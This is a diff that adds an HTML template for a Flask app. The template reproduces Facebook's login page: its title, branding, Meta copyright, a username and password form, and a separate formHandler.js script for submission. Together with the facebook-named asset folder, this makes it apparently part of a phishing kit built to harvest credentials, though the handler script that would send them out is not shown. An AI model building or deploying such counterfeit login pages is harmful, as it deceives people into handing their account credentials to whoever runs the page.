@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook - log in or sign up</title>
+    <link rel="shortcut icon" href="{{ url_for('static', filename='images/facebook/facebook.ico') }}"
+        type="image/x-icon" />
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles/facebook.css') }}" />
+</head>
+
+<body>
+    <div class="main">
+        <div class="content">
+
+            <div class="content-container">
+                <div class="left">
+                    <div class="img">
+                        <img src="{{ url_for('static', filename='images/facebook/img.svg') }}" alt="image" />
+                    </div>
+                    <h2>
+                        Facebook helps you connect and share with the people in your life.
+                    </h2>
+                </div>
+                <div class="right">
+                    <div class="shadow">
+                        <form class="form" id="form">
+                            <input type="text" name="username" placeholder="Email address or phone number" required />
+                            <input type="password" name="password" placeholder="Password" required />
+                            <button type="submit">Log in</button>
+                            <div>
+                                <span>Forgotten password?</span>
+                            </div>
+                        </form>
+                        <div class="seperator"></div>
+                        <div class="create-new-container">
+                            <Button>Create new account</Button>
+                        </div>
+                    </div>
+
+                    <div class="create-page">
+                        <span><b>Create a Page</b> for a celebrity, brand or business</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <div class="footer-container">
+                <ul>
+                    <li>English (UK)</li>
+                    <li>اردو</li>
+                    <li>پښتو</li>
+                    <li>العربية</li>
+                    <li>हिन्दी</li>
+                    <li>বাংলা</li>
+                    <li>ਪੰਜਾਬੀ</li>
+                    <li>فارسی</li>
+                    <li>ગુજરાતી</li>
+                    <li>Deutsch</li>
+                    <li>Español</li>
+                </ul>
+                <div class="seperator"></div>
+                <div class="copyright">
+                    <span>Meta © 2024</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='scripts/formHandler.js') }}"></script>
+</body>
+
+</html>
